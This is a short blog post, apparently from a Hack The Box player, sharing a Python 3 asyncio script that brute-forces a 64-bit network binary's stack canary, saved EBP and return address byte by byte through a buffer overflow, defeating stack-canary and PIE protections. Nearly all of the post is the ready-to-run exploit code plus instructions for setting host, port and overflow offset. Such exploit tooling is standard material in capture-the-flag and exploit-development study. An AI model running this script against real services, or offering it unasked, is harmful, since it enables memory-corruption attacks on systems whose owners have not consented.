---
title: Bruteforcing 64 bits binaries with python 3
description: Script made in python 3 to bruteforce Canary, EBP and return address from a 64 bits binary with Stack canary, NX and PIE enabled.
categories: python
author: Xh4H
tags: bruteforce overflow python3 script
---

# Introduction
Hello, I wanted to share with you a script made in Python 3 without pwntools (pwntools is only officially supporting python 2).

The following script will bruteforce asynchronously the following addresses:

- Stack canary address
- EBP
- Return address

This has been built to bruteforce 64 bits binaries with the following details:

- The binary establishes a listener in certain address and port (localhost, 1337).
- The binary sends one single line and then expects user input.

Since this process is being done asynchronously, the needed time to extract these 3 addresses is reduced a lot compared to a single threaded-single task bruteforce.

# How to run
There are 3 global variables that need to be modified according to our needs.

**HOST** has to point to a valid and resolvable host, such as localhost, 10.10.10.10, etc.

**PORT** has to point to a valid port, such as 1337, 8006, 5050, etc.

**BUFFER_OVERFLOW_OFFSET** has to contain a numeric offset where the binary being bruteforced crashes by overflowing the buffer. If the binary crashes after 80 characters, this variable will contain that number.

Since this is made for python 3, please run it with `python3`. No command line arguments are required.
# Output
The script will output the latest tested payload, Canary, EBP and return address hexadecimal addresses and time needed to bruteforce:

<div style="text-align:center"><img src="/assets/images/brute-1.png" /></div>

# Script
```py
import asyncio, struct, time

initial_time = time.time()
BUFFER_OVERFLOW_OFFSET = 0x38 # offset at which buffer overflow occurs
HOST = "localhost"
PORT = 1337

class SuccessException(Exception):
	pass

def finished():
	finished_time = time.time()
	total = finished_time - initial_time
	print("Bruteforcing finished, time needed: %d s." % total)

try_order = [0] + [x for x in range(1, 256)][::-1]

def u64(data):
	return struct.unpack('<Q', data)[0]

async def try_char(prepend, char, semaphore):
	async with semaphore:
		reader, writer = await asyncio.open_connection(host=HOST, port=PORT)
		payload	= prepend
		payload += bytes([char])

		await reader.read(52)
		writer.write(payload)

		result = await reader.read(-1)

		writer.close()

		if result:
			exception = SuccessException()
			exception.char = char
			raise exception

async def start():
	semaphore = asyncio.BoundedSemaphore(20)

	prepend = b'A' * BUFFER_OVERFLOW_OFFSET
	for _ in range(16):
		print(prepend)
		futures = [asyncio.ensure_future(try_char(prepend, x, semaphore)) for x in try_order]
		done, pending = await asyncio.wait(futures, return_when=asyncio.FIRST_EXCEPTION)
		for pending_task in pending:
			pending_task.cancel()
		for done_task in done:
			try:
				done_task.result()
			except SuccessException as e:
				prepend += bytes([e.char])
				break

	prepend += bytes([0x62]) # 0x62 specific to the tested binary, can be b''
	for _ in range(7): # in case the above line is b'', change to range(8)
		print(prepend)
		futures = [asyncio.ensure_future(try_char(prepend, x, semaphore)) for x in try_order]
		done, pending = await asyncio.wait(futures, return_when=asyncio.FIRST_EXCEPTION)
		for pending_task in pending:
			pending_task.cancel()
		for done_task in done:
			try:
				done_task.result()
			except SuccessException as e:
				prepend += bytes([e.char])
				break

	canary = u64(prepend[BUFFER_OVERFLOW_OFFSET:BUFFER_OVERFLOW_OFFSET+8])
	ebp = u64(prepend[BUFFER_OVERFLOW_OFFSET+8:BUFFER_OVERFLOW_OFFSET+8+8])
	return_addr = u64(prepend[BUFFER_OVERFLOW_OFFSET+8+8:BUFFER_OVERFLOW_OFFSET+8+8+8])

	print('[*] Canary: 0x%x\n[*] EBP: 0x%x\n[*] ret_addr: 0x%x' % (canary, ebp, return_addr))
	finished()
	

loop = asyncio.get_event_loop()
loop.run_until_complete(start())
```

Props to goeo for his asynchronous skills.

Thanks for reading :)

<script src="https://www.hackthebox.eu/badge/21439"></script>
